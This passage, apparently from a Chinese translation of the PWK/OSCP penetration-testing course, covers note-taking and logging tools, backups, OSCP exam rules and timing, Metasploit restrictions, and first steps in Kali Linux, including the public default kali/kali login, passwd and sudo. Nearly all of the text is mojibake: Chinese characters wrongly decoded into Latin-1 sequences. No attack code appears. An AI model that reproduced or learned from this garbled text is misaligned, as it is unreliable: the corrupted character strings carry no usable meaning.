èƒ½å¤Ÿè¿…é€Ÿæ‰¾åˆ°ä½ éœ€è¦çš„ä¿¡æ¯ã€‚åŸ¹å…»è‰¯å¥½çš„æ–‡æ¡£æŠ€èƒ½è¿˜å¯ä»¥è®©ä½ è¿…é€Ÿæ‰¾åˆ°å‡ å¤©å‰ç”¨æ¥æ”»å‡»æŸå°æœºå™¨çš„é•¿å‘½ä»¤ï¼Œå¦‚æœä½ éœ€è¦é‡æ–°æ”»å‡»å®ƒï¼Œæˆ–è€…åœ¨æˆåŠŸå…¥ä¾µæ¯å°ç›®æ ‡æœºå™¨åï¼Œåœ¨æ”»å‡»åäº¤å‰å‚è€ƒç”¨æˆ·ã€‚\n\néšç€æ—¶é—´çš„æ¨ç§»ï¼Œä½ å°†å¼€å§‹ä¸ºä½ çš„ç¬”è®°ç”Ÿæˆç²—ç•¥çš„æ¨¡æ¿å’Œæ ¼å¼ã€‚å› æ­¤ï¼Œåœ¨è¯¾ç¨‹å¼€å§‹å’Œç»“æŸæ—¶ï¼Œä½ çš„ç¬”è®°å¸ƒå±€å’Œç»†èŠ‚ä¼šæœ‰æ‰€ä¸åŒã€‚æˆ‘ä»¬ç»å¸¸å¬åˆ°å­¦ç”Ÿè¯„è®ºè¯´ï¼Œä»–ä»¬åœ¨å¼€å§‹æ—¶é”™è¿‡äº†æŸäº›ä¿¡æ¯ï¼Œè€Œä»–ä»¬ä¸å¾—ä¸å›åˆ° \"æ—©æœŸç›®æ ‡ \"å»æ”¶é›†è¿™äº›ä¿¡æ¯ã€‚\n\näº‰å–ä»ä¸€ä¸ªç›®æ ‡ä¸Šæ”¶é›†å°½å¯èƒ½å¤šçš„ä¿¡æ¯ã€‚è¿™å°†ä½¿ä½ èƒ½å¤Ÿç”Ÿæˆä¸€ä»½å®Œæ•´çš„æŠ¥å‘Šï¼Œå³ä½¿ä½ ä¸èƒ½è¿›å…¥å®éªŒå®¤ã€‚æ‹¥æœ‰å¥½çš„ã€è¯¦ç»†çš„ç¬”è®°åœ¨å®éªŒå®¤å¼€å‘åçš„é˜¶æ®µå°†ç‰¹åˆ«æœ‰ç”¨ï¼Œå› ä¸ºæœ‰æŸäº›ä¿¡æ¯æ˜¯ç°æˆçš„ï¼Œåº”è¯¥æœ‰åŠ©äºä½ æ‰¾åˆ°å®éªŒå®¤æœºå™¨ä¹‹é—´çš„æ˜ç¡®è”ç³»ï¼Œç­‰ç­‰ã€‚ä¸€ä¸ªå¥½çš„è®°å½•è¿‡ç¨‹å°†ä¸ºä½ èŠ‚çœç›¸å½“å¤šçš„æ—¶é—´ï¼Œä¹Ÿä¼šä¸ºä½ èŠ‚çœä¸€äº›å¤´ç—›çš„é—®é¢˜ã€‚\n\n### è®¾ç½®ä¸æç¤º\n\nåšå¥½ç¬”è®°çš„å…³é”®æ˜¯èƒ½å¤Ÿæ”¶é›†å°½å¯èƒ½å¤šçš„ä¿¡æ¯ï¼Œå¹¶èƒ½éšæ—¶è·å–è¿™äº›ä¿¡æ¯ã€‚ä¿¡æ¯é‡å¯èƒ½ä¼šéšç€æ—¶é—´çš„æ¨ç§»è€Œå˜åŒ–ï¼Œè€Œä½ å¿«é€Ÿæ‰¾åˆ°æ‰€éœ€ä¿¡æ¯çš„è¿‡ç¨‹ä¹Ÿå¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚\n\nä½ è¿˜éœ€è¦äº†è§£ä¿¡æ¯çš„å­˜å‚¨åœ°ç‚¹--æ˜¯æœ¬åœ°è¿˜æ˜¯è¿œç¨‹ï¼Ÿå®ƒæ˜¯å¦è¢«åŠ å¯†ï¼Ÿ æ˜¯å¦æœ‰ä»»ä½•æ•æ„Ÿä¿¡æ¯æ˜¯ä½ ç¬”è®°çš„ä¸€éƒ¨åˆ†ï¼Ÿ å¦‚æœæœ‰ï¼Œè¯·è€ƒè™‘ä½ çš„ä¿¡æ¯ï¼ˆæˆ–è€…æ›´ç³Ÿç³•çš„æ˜¯ï¼Œä½ çš„å®¢æˆ·çš„ä¿¡æ¯ï¼‰å¯èƒ½ä¼šè½å…¥åäººæ‰‹ä¸­ã€‚\n\nå¼€å§‹æ—¶ï¼Œæˆ‘ä»¬å¼ºçƒˆå»ºè®®ä½ æ•æ‰å’Œè®°å½•ä¸€åˆ‡ã€‚ æŸäº›å·¥å…·æ”¯æŒå°†å…¶è¾“å‡ºå†™å…¥æ–‡ä»¶ï¼Œå…¶ä¸­ä¸€äº›å·¥å…·ç”šè‡³æœ‰æŠ¥å‘ŠåŠŸèƒ½ã€‚æ•æ‰ä½ çš„ç»ˆç«¯è¾“å‡ºï¼Œç„¶åå°†å…¶ä¸ä½ çš„ä¸ªäººç¬”è®°ç›¸ç»“åˆï¼Œæœ‰æ—¶ä¹Ÿä¼šæœ‰å¸®åŠ©ã€‚ ç¡®ä¿æ³¨é‡Šï¼Œçªå‡ºé‡è¦éƒ¨åˆ†ï¼Œå¹¶å†™ä¸‹ä»»ä½•ä½ è®¤ä¸ºç›¸å…³çš„ä¸œè¥¿ã€‚è¯·è®°ä½ï¼Œæœ‰æ—¶ä¸€å¼ æˆªå›¾èƒœè¿‡åƒè¨€ä¸‡è¯­ï¼Œæ‰€ä»¥è¯·ç¡®ä¿ä½ ä¹Ÿæ‹ä¸‹å®ƒä»¬ã€‚\n\n### è®°ç¬”è®°çš„å·¥å…·\n\næœ‰å¾ˆå¤šç¬”è®°å·¥å…·å¯ä»¥é€‰æ‹©ï¼Œå¦‚ OneNote$^{11}$ï¼ˆWindows/MacOSï¼‰ã€DayOne$^{12}$ï¼ˆmacOSï¼‰æˆ– Joplin$^{13}$ï¼ˆMacOS/Windows/Linuxï¼‰ç­‰ã€‚\n\nä½ ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨åƒ MDwiki$^{14}$ è¿™æ ·çš„å·¥å…·ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŸºäº markdown çš„ wikiï¼Œå…è®¸ä½ ç”¨ markdown å†™ä½œï¼Œç„¶åç”¨ HTML æ¸²æŸ“è¾“å‡ºã€‚\n\næ— è®ºä½ å–œæ¬¢å“ªç§å·¥å…·ï¼Œæ”¶é›†RAWè¾“å‡ºçš„æœ€å¥½æ–¹æ³•æ˜¯è®¾ç½®æŸç§ç±»å‹çš„è®°å½•ï¼Œç„¶åå¿˜è®°å®ƒï¼ˆç›´åˆ°éœ€è¦å®ƒï¼‰ã€‚è¿™æ ·ä¸€æ¥ï¼Œè¾“å‡ºå°±ä¼šè‡ªåŠ¨ä¿å­˜ï¼Œä½ å°±ä¸å¿…æ‹…å¿ƒè¦è®°å¾—è¿”å›ä½ çš„ç¬”è®°ã€‚æœ‰å‡ ç§æ–¹æ³•å¯ä»¥ä½¿æ˜¾ç¤ºåœ¨ç»ˆç«¯çš„æ‰€æœ‰è¾“å‡ºå¾—åˆ°ä¿å­˜ï¼Œå…¶ä¸­ä¸€äº›æ–¹æ³•åŒ…æ‹¬ï¼š\n\n- scriptï¼šä¸€æ—¦æ‰§è¡Œï¼Œæ‰€æœ‰çš„è¾“å‡ºï¼ˆåŒ…æ‹¬bashçš„é¢œè‰²å’Œåç¼€ï¼‰éƒ½ä¼šè¢«ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå¯ä»¥åœ¨ä»»ä½•æ—¶å€™é‡æ–°æ’­æ”¾ã€‚\n- terminatorï¼šä¸€ä¸ªå¤‡ç”¨çš„ç»ˆç«¯æ¨¡æ‹Ÿå™¨ï¼Œå…·æœ‰å„ç§åŠŸèƒ½å’Œæ’ä»¶ï¼Œå¦‚Loggerï¼ˆå°†æ‰€æœ‰è¾“å‡ºä¿å­˜åˆ°æ–‡æœ¬æ–‡ä»¶ï¼‰å’ŒTerminalShotï¼ˆåœ¨ç»ˆç«¯å†…è¿›è¡Œå±å¹•æˆªå›¾ï¼‰ã€‚\n\n**æ³¨æ„**ï¼šç®¡é“è¾“å‡ºï¼ˆ>ï¼‰æˆ–ä½¿ç”¨teeä¹Ÿæ˜¯ä¸€ç§é€‰æ‹©ï¼Œä½†ä½ å¿…é¡»å¯¹æ¯ä¸ªå‘½ä»¤ä½¿ç”¨å®ƒä»¬ï¼Œæ‰€ä»¥ä½ å¿…é¡»è®°ä½æ¯æ¬¡éƒ½è¦è¿è¡Œå®ƒä»¬ã€‚\n\nä¸ºäº†å¤„ç†æ¸—é€æµ‹è¯•æœŸé—´æ”¶é›†åˆ°çš„å¤§é‡ä¿¡æ¯ï¼Œæˆ‘ä»¬å–œæ¬¢ä½¿ç”¨ä¸€ä¸ªå¤šç”¨é€”çš„ç¬”è®°åº”ç”¨ç¨‹åºæ¥åˆæ­¥è®°å½•æˆ‘ä»¬çš„æ‰€æœ‰å‘ç°ã€‚ ä½¿ç”¨è¿™æ ·çš„åº”ç”¨ç¨‹åºæ—¢æœ‰åŠ©äºä»æ•°å­—ä¸Šç»„ç»‡æ•°æ®ï¼Œä¹Ÿæœ‰åŠ©äºä»ç²¾ç¥ä¸Šç»„ç»‡æ•°æ®ã€‚æ¸—é€æµ‹è¯•ç»“æŸåï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶æ¥ç¼–åˆ¶å®Œæ•´çš„æŠ¥å‘Šã€‚\n\nåªè¦è¾“å‡ºç»“æœæ¸…æ™°æ˜“è¯»ï¼Œä½ ç”¨å“ªç§ç¨‹åºåšä¸´æ—¶æ–‡ä»¶å¹¶ä¸é‡è¦ã€‚ ä¹ æƒ¯äºè®°å½•ä½ çš„å·¥ä½œå’Œå‘ç°ã€‚ è¿™æ˜¯å®Œæˆå·¥ä½œçš„å”¯ä¸€ä¸“ä¸šæ–¹å¼!\n\n### å¤‡ä»½\n\næœ‰ä¸¤ç§äººï¼šä¸€ç§æ˜¯å®šæœŸå¤‡ä»½ä»–ä»¬çš„æ–‡ä»¶ï¼Œå¦ä¸€ç§æ˜¯å¸Œæœ›ä»–ä»¬è¿™æ ·åšã€‚å¤‡ä»½é€šå¸¸è¢«è®¤ä¸ºæ˜¯ä¸€ç§ä¿é™©ã€‚ä½ æ°¸è¿œä¸çŸ¥é“ä½ ä»€ä¹ˆæ—¶å€™ä¼šéœ€è¦å®ƒï¼Œç›´åˆ°ä½ éœ€è¦å®ƒä¸ºæ­¢! ä½œä¸ºä¸€èˆ¬è§„åˆ™ï¼Œæˆ‘ä»¬å»ºè®®ä½ å®šæœŸå¤‡ä»½ä½ çš„æ–‡ä»¶ã€‚æŠŠä½ çš„å¤‡ä»½ä¿å­˜åœ¨ä¸€ä¸ªå®‰å…¨çš„åœ°æ–¹ã€‚ä½ è‚¯å®šä¸å¸Œæœ›å®ƒä»¬æœ€ç»ˆå‡ºç°åœ¨å…¬å…±git repoæˆ–äº‘ä¸­ï¼\n\næ–‡ä»¶ä¸åº”è¯¥æ˜¯ä½ å”¯ä¸€å¤‡ä»½çš„ä¸œè¥¿ã€‚ç¡®ä¿ä½ å¤‡ä»½äº†ä½ çš„Kaliè™šæ‹Ÿæœºä¸Šçš„é‡è¦æ–‡ä»¶ï¼Œå¦‚æœéœ€è¦çš„è¯ï¼Œé‡‡å–é€‚å½“çš„å¿«ç…§ï¼Œç­‰ç­‰ã€‚è°¨æ…è¡Œäº‹æ€»æ˜¯æœ€å¥½çš„ã€‚\n\n## å…³äº OSCP è€ƒè¯•\n\nOSCPè®¤è¯è€ƒè¯•æ¨¡æ‹Ÿäº†ä¸€ä¸ªåŒ…å«å°‘é‡è„†å¼±æœºå™¨çš„ç§æœ‰VPNçš„å®æ—¶ç½‘ç»œã€‚ è¦é€šè¿‡è€ƒè¯•ï¼Œä½ å¿…é¡»å¾—åˆ° 70 åˆ†ã€‚ å¯¹æœ‰é™çš„è®¿é—®ä»¥åŠå®Œå…¨çš„ç³»ç»Ÿç ´åéƒ½ä¼šå¾—åˆ°åˆ†æ•°ã€‚åœ¨è€ƒè¯•æœŸé—´ï¼Œç¯å¢ƒæ˜¯å®Œå…¨ä¸ºä½ æœåŠ¡çš„ï¼Œä½ å°†æœ‰23å°æ—¶45åˆ†é’Ÿæ¥å®Œæˆè€ƒè¯•ã€‚\n\næ¯å°ç›®æ ‡æœºçš„å…·ä½“è¯´æ˜å°†ä½äºä½ çš„è€ƒè¯•æ§åˆ¶é¢æ¿ä¸­ï¼Œåªæœ‰åœ¨è€ƒè¯•å¼€å§‹åä½ æ‰èƒ½ä½¿ç”¨ä½ çš„è€ƒè¯•åŒ…ï¼ŒåŒ…æ‹¬ä¸€ä¸ªVPNè¿æ¥åŒ…å’Œå…¶ä»–æ˜ï¼Œå°†åŒ…å«å”¯ä¸€çš„URLï¼Œä½ å¯ä»¥ç”¨æ¥è®¿é—®ä½ çš„è€ƒè¯•æ§åˆ¶é¢æ¿ã€‚\n\nä¸ºäº†ç¡®ä¿æˆ‘ä»¬è®¤è¯çš„å®Œæ•´æ€§ï¼Œè€ƒè¯•å°†é‡‡ç”¨è¿œç¨‹ç›‘è€ƒã€‚ä½ éœ€è¦åœ¨è€ƒè¯•å¼€å§‹å‰15åˆ†é’Ÿåˆ°åœºï¼Œè¿›è¡Œèº«ä»½éªŒè¯å’Œå…¶ä»–è€ƒå‰å·¥ä½œã€‚åœ¨å®‰æ’è€ƒè¯•ä¹‹å‰ï¼Œè¯·åŠ¡å¿…é˜…è¯»æˆ‘ä»¬çš„ç›‘è€ƒå¸¸è§é—®é¢˜$^{15}$ã€‚\n\nè€ƒè¯•ç»“æŸåï¼Œä½ å°†æœ‰é¢å¤–çš„24å°æ—¶æ¥æ•´ç†ä½ çš„è€ƒè¯•æŠ¥å‘Šå¹¶è®°å½•ä½ çš„å‘ç°ã€‚ä½ å°†æ ¹æ®è€ƒè¯•æŠ¥å‘Šçš„è´¨é‡å’Œå†…å®¹è¿›è¡Œè¯„ä¼°ï¼Œæ‰€ä»¥è¯·å°½å¯èƒ½å¤šåœ°åŒ…æ‹¬ç»†èŠ‚ï¼Œå¹¶ç¡®ä¿ä½ çš„å‘ç°éƒ½æ˜¯å¯é‡å¤çš„ã€‚\n\nå¦å¤–ï¼Œè¯·æ³¨æ„ï¼Œæ¥å—ä½ çš„è€ƒè¯•æäº¤æ˜¯ä¸€ä¸ªäººå·¥è¿‡ç¨‹ï¼Œæ‰€ä»¥åœ¨ä½ æ”¶åˆ°æˆ‘ä»¬çš„æ­£å¼é€šçŸ¥è¯´æˆ‘ä»¬å·²ç»æ”¶åˆ°ä½ çš„æ–‡ä»¶ä¹‹å‰ï¼Œå¯èƒ½éœ€è¦ä¸€äº›æ—¶é—´ã€‚\n\nä¸€æ—¦ä½ çš„è€ƒè¯•æ–‡ä»¶è¢«æ¥å—ï¼Œä½ çš„è€ƒè¯•å°†è¢«æ‰“åˆ†ï¼Œä½ å°†åœ¨10ä¸ªå·¥ä½œæ—¥å†…æ”¶åˆ°ä½ çš„æˆç»©ã€‚ å¦‚æœä½ è¾¾åˆ°äº†åˆæ ¼çš„åˆ†æ•°ï¼Œæˆ‘ä»¬ä¼šè¦æ±‚ä½ ç¡®è®¤ä½ çš„å®é™…åœ°å€ï¼Œä»¥ä¾¿æˆ‘ä»¬èƒ½å¤Ÿé‚®å¯„ä½ çš„è¯ä¹¦ã€‚å¦‚æœä½ æ²¡æœ‰è¾¾åˆ°è¦æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼šé€šçŸ¥ä½ ï¼Œä½ å¯ä»¥ä½¿ç”¨é€‚å½“çš„é“¾æ¥è´­ä¹°è®¤è¯é‡è€ƒã€‚\n\næˆ‘ä»¬å¼ºçƒˆå»ºè®®ä½ æŠŠè€ƒè¯•æ—¶é—´ä»”ç»†å®‰æ’åœ¨36å°æ—¶å†…ï¼Œç¡®ä¿æ²¡æœ‰å¤–ç•Œå¹²æ‰°æˆ–æ‰¿è¯ºã€‚ å¦å¤–ï¼Œè¯·æ³¨æ„ï¼Œè€ƒè¯•çš„å¯ç”¨æ€§æ˜¯ä»¥å…ˆåˆ°å…ˆå¾—çš„æ–¹å¼å¤„ç†çš„ï¼Œæ‰€ä»¥æœ€å¥½å°½å¯èƒ½æå‰å®‰æ’è€ƒè¯•ï¼Œä»¥ç¡®ä¿ä½ çš„é¦–é€‰æ—¥æœŸå¯ç”¨ã€‚ å…³äºè€ƒè¯•çš„å…¶ä»–ä¿¡æ¯ï¼Œæˆ‘ä»¬é¼“åŠ±ä½ èŠ±ä¸€äº›æ—¶é—´æ¥é˜…è¯»OSCPè€ƒè¯•æŒ‡å—$^{16}$ã€‚\n\n### Metasploit çš„ä½¿ç”¨ - å®éªŒå®¤ä¸è€ƒè¯•\n\næˆ‘ä»¬é¼“åŠ±ä½ åœ¨å®éªŒå®¤é‡Œä½¿ç”¨Metasploitã€‚Metasploitæ˜¯ä¸€ä¸ªä¼Ÿå¤§çš„å·¥å…·ï¼Œä½ åº”è¯¥å­¦ä¹ å®ƒæ‰€æä¾›çš„æ‰€æœ‰åŠŸèƒ½ã€‚è™½ç„¶Metasploitçš„ä½¿ç”¨åœ¨OSCPè®¤è¯è€ƒè¯•ä¸­å—åˆ°é™åˆ¶ï¼Œä½†æˆ‘ä»¬å°†é¼“åŠ±ä½ åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­ä¸è¦å¯¹è‡ªå·±æ–½åŠ ä»»æ„çš„é™åˆ¶ã€‚å…³äºMetasploitä½¿ç”¨çš„æ›´å¤šä¿¡æ¯å¯ä»¥åœ¨OSCPè€ƒè¯•æŒ‡å—ä¸­æ‰¾åˆ°ã€‚\n\n## ç»“æŸè¯­\n\nåœ¨è¿™ä¸ªæ¨¡å—ä¸­ï¼Œæˆ‘ä»¬è®¨è®ºäº†å……åˆ†åˆ©ç”¨PWKè¯¾ç¨‹å’Œå®éªŒå®¤æ‰€éœ€çš„é‡è¦ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜ä»‹ç»äº†æŠ¥å‘Šå†™ä½œçš„åŸºæœ¬çŸ¥è¯†ä»¥åŠå¦‚ä½•å‚åŠ OSCPçš„æœ€ç»ˆè€ƒè¯•ã€‚\n\næˆ‘ä»¬ç¥æ„¿ä½ åœ¨PWKçš„æ—…ç¨‹ä¸­å¥½è¿ï¼Œå¹¶å¸Œæœ›ä½ äº«å—ä½ å°†é¢ä¸´çš„æ–°æŒ‘æˆ˜ã€‚\n\n# èˆ’é€‚åœ°ä½¿ç”¨ Kali Linux\n\nKali Linux æ˜¯ç”± Offensive Security å¼€å‘ã€èµ„åŠ©å’Œç»´æŠ¤çš„ã€‚å®ƒæ˜¯ä¸€ä¸ªåŸºäº Debian çš„ Linux å‘è¡Œç‰ˆï¼Œæ—¨åœ¨è¿›è¡Œé«˜çº§æ¸—é€æµ‹è¯•å’Œå®‰å…¨å®¡è®¡ã€‚Kali åŒ…å«å‡ ç™¾ä¸ªå·¥å…·ï¼Œé¢å‘å„ç§ä¿¡æ¯å®‰å…¨ä»»åŠ¡ï¼Œå¦‚æ¸—é€æµ‹è¯•ã€å®‰å…¨ç ”ç©¶ã€è®¡ç®—æœºå–è¯å’Œé€†å‘å·¥ç¨‹ã€‚\n\næ‰€æœ‰éšæ“ä½œç³»ç»Ÿæ‰“åŒ…çš„ç¨‹åºéƒ½ç»è¿‡äº†è¯„ä¼°ï¼Œä»¥ç¡®å®šå…¶é€‚ç”¨æ€§å’Œæœ‰æ•ˆæ€§ã€‚ å®ƒä»¬åŒ…æ‹¬ç”¨äºç½‘ç»œæ¸—é€æµ‹è¯•çš„Metasploitï¼Œç”¨äºç«¯å£å’Œæ¼æ´æ‰«æçš„Nmapï¼Œç”¨äºç›‘æ§ç½‘ç»œæµé‡çš„Wiresharkï¼Œä»¥åŠç”¨äºæµ‹è¯•æ— çº¿ç½‘ç»œå®‰å…¨çš„Aircrack-ngç­‰ç­‰ã€‚\n\næœ¬æ¨¡å—çš„ç›®æ ‡æ˜¯æä¾›ä¸€ä¸ªåŸºçº¿ï¼Œè®©æ‰€æœ‰æŠ€èƒ½æ°´å¹³çš„ç”¨æˆ·ä¸ºå³å°†åˆ°æ¥çš„æ¨¡å—åšå¥½å‡†å¤‡ã€‚æˆ‘ä»¬å°†æ¢è®¨æ–°ç”¨æˆ·çš„æŠ€å·§å’Œçªé—¨ï¼Œå¹¶å›é¡¾ä¸€äº›é«˜çº§ç”¨æˆ·å¯èƒ½æ¬£èµçš„æ ‡å‡†ã€‚æ— è®ºæŠ€èƒ½æ°´å¹³å¦‚ä½•ï¼Œæˆ‘ä»¬éƒ½å»ºè®®åœ¨æœ¬æ¨¡å—ä¸­å…³æ³¨é€‚å½“çš„æ°´å¹³ã€‚æ­£å¦‚äºšä¼¯æ‹‰ç½•-æ—è‚¯è¢«ä¼ è¨€çš„é‚£æ ·ï¼Œ\"ç»™æˆ‘å…­ä¸ªå°æ—¶å»ç ä¸€æ£µæ ‘ï¼Œæˆ‘å°†èŠ±å‰å››ä¸ªå°æ—¶å»ç£¨æ–§å¤´\"ã€‚\n\næ­¤å¤–ï¼Œæˆ‘ä»¬é¼“åŠ±æ‰€æœ‰æŠ€èƒ½æ°´å¹³çš„ç”¨æˆ·æŸ¥çœ‹KaliåŸ¹è®­ç½‘ç«™ä¸Šçš„å…è´¹åœ¨çº¿åŸ¹è®­ã€‚17è¿™ä¸ªç½‘ç«™åŒ…æ‹¬KaliLinux Revealedä¸€ä¹¦ï¼Œæ—¨åœ¨æµ‹è¯•ä½ çš„ç†è§£çš„ç»ƒä¹ ï¼Œä¸€ä¸ªä¸“é—¨çš„æ”¯æŒè®ºå›ï¼Œä»¥åŠæ›´å¤šã€‚ è¿™äº›å…è´¹èµ„æºä¸ºæ‰€æœ‰æŠ€èƒ½æ°´å¹³çš„ç”¨æˆ·æä¾›äº†æœ‰ä»·å€¼çš„è§è§£ï¼Œæ˜¯æœ¬è¯¾ç¨‹åŸ¹è®­çš„ä¸€ä¸ªå¾ˆå¥½çš„è¡¥å……ã€‚\n\n## å¯åŠ¨ Kali Linux\n\né¦–å…ˆï¼Œä¸‹è½½å®˜æ–¹çš„Kali Linux 64ä½ï¼ˆamd64ï¼‰VMwareè™šæ‹Ÿæœºï¼ˆVMï¼‰$^{18}$å’Œä½ é€‰æ‹©ä½¿ç”¨çš„VMwareè½¯ä»¶ã€‚VMwareä¸ºVMware WorkStation Pro$^{19}$ å’ŒVMware Fusion for Macæä¾›äº†å…è´¹è¯•ç”¨ç‰ˆã€‚$^{20}$ ä½¿ç”¨è¿™äº›å•†ä¸šç‰ˆæœ¬çš„å¥½å¤„æ˜¯èƒ½å¤Ÿæ‹æ‘„å¿«ç…§ï¼Œå¦‚æœä½ éœ€è¦é‡ç½®ä½ çš„è™šæ‹Ÿæœºåˆ°ä¸€ä¸ªå¹²å‡€çš„åœ°æ–¹ï¼Œä½ å¯ä»¥æ¢å¤åˆ°å¿«ç…§ã€‚VMwareè¿˜æä¾›äº†ä¸€ä¸ªå…è´¹ç‰ˆæœ¬çš„è½¯ä»¶ï¼Œå³VMware WorkStation Player.$^{21}$ä½†æ˜¯ï¼Œå…è´¹ç‰ˆæœ¬æ²¡æœ‰å¿«ç…§åŠŸèƒ½ã€‚\n\næˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ª64ä½ï¼ˆamd64ï¼‰çš„Kali Linuxè™šæ‹Ÿæœºï¼Œæ‰€ä»¥ä¸ºäº†è·å¾—æœ€ä½³æ•ˆæœå¹¶ä¸å®éªŒæŒ‡å—ä¿æŒä¸€è‡´ï¼Œæˆ‘ä»¬å»ºè®®ä½ ä¹Ÿä½¿ç”¨å®ƒã€‚ä¸è¦åç¦»è¿™ä¸ªæ ‡å‡†çš„æ„å»ºï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šåˆ›é€ ä¸€ä¸ªä¸è¯¾ç¨‹åŸ¹è®­ææ–™ä¸ä¸€è‡´çš„å·¥ä½œç¯å¢ƒã€‚\n\nä½ å¯ä»¥åœ¨Offensive Securityçš„æ”¯æŒç½‘ç«™$^{22}$ä¸Šæ‰¾åˆ°æœ€æ–°çš„Kali Linuxè™šæ‹Ÿæœºé•œåƒä»¥åŠæœ€æ–°çš„éªŒè¯ä¸‹è½½æ¡£æ¡ˆçš„è¯´æ˜ã€‚ä½œä¸ºä¸€ä¸ªå®‰å…¨ä¸“å®¶ï¼Œä½ åº”è¯¥åœ¨ä½¿ç”¨ä»»ä½•ä½ ä¸‹è½½çš„æ–‡ä»¶ä¹‹å‰æ€»æ˜¯èŠ±æ—¶é—´æ­£ç¡®éªŒè¯å®ƒã€‚ä¸è¿™æ ·åšä¼šä½¿ä½ å’Œä½ çš„å®¢æˆ·é¢ä¸´ä¸å¿…è¦çš„é£é™©ã€‚\n\nä¸ºäº†ä½¿ç”¨Kali Linuxè™šæ‹Ÿæœºï¼Œæˆ‘ä»¬å°†é¦–å…ˆè§£å‹å­˜æ¡£ï¼Œå¹¶ç”¨VMwareæ‰“å¼€.vmxæ–‡ä»¶ã€‚å¦‚æœå‡ºç°äº†é€‰é¡¹ï¼Œè¯·é€‰æ‹© \"æˆ‘å¤åˆ¶äº†å®ƒ\"ï¼Œä»¥æŒ‡ç¤ºè™šæ‹Ÿæœºç”Ÿæˆä¸€ä¸ªæ–°çš„è™šæ‹ŸMACåœ°å€ï¼Œé¿å…æ½œåœ¨çš„å†²çªã€‚\n\nè™šæ‹Ÿæœºçš„é»˜è®¤å‡­è¯æ˜¯ï¼š\n\n- **Username**: kali\n- **Password**: kali\n\n<aside> ğŸ’¡ åœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶ï¼Œä»ç»ˆç«¯ä½¿ç”¨passwdå‘½ä»¤æ›´æ”¹æ‰€æœ‰é»˜è®¤å¯†ç æ˜¯å¾ˆé‡è¦çš„ã€‚æˆ‘ä»¬è¦å’Œå…¶ä»–å­¦ç”Ÿä¸€èµ·è¿æ¥åˆ°ä¸€ä¸ªåœ¨çº¿å®éªŒå®¤ï¼Œé»˜è®¤å¯†ç å‡ ä¹å¯ä»¥ä¿è¯ä¿çš®çš„æ»¥ç”¨!\n\n</aside>\n\nè¦æ”¹å˜å¯†ç ï¼Œç‚¹å‡»ç»ˆç«¯å›¾æ ‡ï¼Œå‘å‡ºå†…ç½®çš„passwdå‘½ä»¤ï¼š\n\n```bash\nkali@kali:~$ passwd\nChanging password for kali.\n(current) UNIX password:\nEnter new UNIX password:\nRetype new UNIX password:\npasswd: password updated successfully\n```\n\næ¸…å• 1 - æ›´æ”¹ kali ç”¨æˆ·çš„é»˜è®¤å¯†ç \n\nKali Linuxè™šæ‹Ÿæœºå°†åŒ…å«ä¸¤ä¸ªé»˜è®¤ç”¨æˆ·ï¼Œ\"root \"å’Œ \"kali\"ã€‚æˆ‘ä»¬å°†ä½¿ç”¨kaliç”¨æˆ·è´¦æˆ·ã€‚è™½ç„¶ä½œä¸ºæ ¹ç”¨æˆ·ç™»å½•å¯èƒ½æ˜¯å¾ˆè¯±äººçš„ï¼Œä½†ä¸å»ºè®®è¿™æ ·åšã€‚æ ¹ç”¨æˆ·æœ‰ä¸å—é™åˆ¶çš„è®¿é—®æƒï¼Œä¸€ä¸ªä¸å°å¿ƒçš„å‘½ä»¤å¯èƒ½ä¼šç ´åæˆ‘ä»¬çš„ç³»ç»Ÿã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œå¦‚æœå¯¹æ‰‹åˆ©ç”¨ä»¥rootèº«ä»½è¿è¡Œçš„è¿›ç¨‹ï¼Œä»–ä»¬å°†å®Œå…¨æ§åˆ¶æˆ‘ä»¬çš„æœºå™¨ã€‚\n\nè®¸å¤šå‘½ä»¤éœ€è¦é«˜æƒé™æ‰èƒ½è¿è¡Œï¼Œå¹¸è¿çš„æ˜¯ï¼Œsudoå‘½ä»¤å¯ä»¥å…‹æœè¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬åœ¨æˆ‘ä»¬å¸Œæœ›è¿è¡Œçš„å‘½ä»¤åé¢è¾“å…¥sudoï¼Œå¹¶åœ¨æç¤ºæ—¶æä¾›æˆ‘ä»¬çš„å¯†ç ã€‚\n\n```bash\nkali@kali:~$ whoami\nkali\n\nkali@kali:~$ sudo whoami\n[sudo] password for kali:\nroot\n```\n\næ¸…å•2 - ä½¿ç”¨sudoä»¥rootèº«ä»½è¿è¡Œä¸€ä¸ªå‘½ä»¤\n\næœ€åï¼Œæ¢è®¨ä¸€ä¸‹VMwareçš„å¿«ç…§åŠŸèƒ½ï¼Œå®ƒå…è®¸æˆ‘ä»¬å°†è™šæ‹Ÿæœºæ¢å¤æˆ–é‡ç½®åˆ°ä¸€ä¸ªå¹²å‡€çš„åœ°æ–¹ã€‚å¦‚æœå‡ºäº†é—®é¢˜ï¼Œå®šæœŸå¿«ç…§å¯ä»¥èŠ‚çœå¤§é‡çš„æ—¶é—´å’ŒæŒ«æŠ˜æ„Ÿã€‚\n\n## Kali èœå•\n\nKali Linuxçš„èœå•åŒ…æ‹¬å¯¹å‘è¡Œç‰ˆä¸­çš„è®¸å¤šå·¥å…·çš„åˆ†ç±»é“¾æ¥ã€‚è¿™ç§ç»“æ„æœ‰åŠ©äºæ¾„æ¸…æ¯ä¸ªå·¥å…·çš„ä¸»è¦ä½œç”¨ï¼Œä»¥åŠå…¶ä½¿ç”¨çš„èƒŒæ™¯ã€‚\n\nèŠ±ç‚¹æ—¶é—´æµè§ˆä¸€ä¸‹Kali 